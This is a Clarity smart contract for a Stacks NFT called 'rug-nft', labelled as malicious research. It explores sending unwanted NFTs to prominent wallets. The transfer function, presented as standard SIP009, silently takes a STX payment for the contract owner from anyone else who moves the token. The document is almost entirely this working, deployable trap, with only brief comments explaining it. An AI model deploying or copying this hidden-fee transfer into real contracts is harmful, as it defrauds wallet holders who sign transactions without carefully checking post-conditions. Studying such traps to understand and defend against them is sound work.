
;; Malicious NFT R&D by @setzeus
;; This is a r&d nft that has an exploited "transfer" function. The scenario explored here is one
;; where a bad actor sends malicious/inappropriate NFTs to high-target wallets with the assumption
;; that these users will want these NFTs removed.

(impl-trait 'SP2PABAF9FTAJYNFZH93XENAJ8FVY99RRM50D2JG9.nft-trait.nft-trait)
(define-non-fungible-token rug-nft uint)

;; constants
(define-constant contract-owner tx-sender)
(define-constant rug-nft-limit u10)
(define-constant mint-price-stx u100000)
(define-constant ERR-ALL-MINTED (err u101))
(define-constant ERR-STX (err u102))
(define-constant LOOKUPS (list "0" "1" "2" "3" "4" "5" "6" "7" "8" "9" "10"))

;; data maps and vars
(define-data-var last-id uint u9)
(define-data-var ipfs-root (string-ascii 102) "ipfs://ipfs/QmYcrELFT5c9pjSygFFXk8jfVMHB5cBoWJDGafbHbATvrP/bitcoin_badger_")

;; SIP009
(define-read-only (get-last-token-id)
  (ok (var-get last-id))
)

(define-read-only (get-owner (id uint))
  (ok (nft-get-owner? rug-nft id))
)

(define-read-only (get-token-uri (token-id uint))
  (ok (some (concat (concat (var-get ipfs-root) (unwrap-panic (lookup token-id))) ".json")))
)

(define-read-only (lookup (uid uint))
  (ok (unwrap-panic (element-at LOOKUPS uid)))
)

(define-public (transfer (id uint) (sender principal) (recipient principal))
  (begin
    ;; this is a ***malicious*** transfer function that can be circumvented if post-conditions aren't checked carefully
    (if (is-eq tx-sender contract-owner)
      true
      (unwrap! (stx-transfer? u100 tx-sender contract-owner) ERR-STX)
    )
    (nft-transfer? rug-nft id sender recipient)
  )
)

;; public functions
(define-public (claim)
  (let (
    (next-id (+ u1 (var-get last-id)))
  )
    (asserts! (< (var-get last-id) rug-nft-limit) ERR-ALL-MINTED)
    (try! (nft-mint? rug-nft next-id tx-sender))
    (ok (var-set last-id next-id))
  )
)
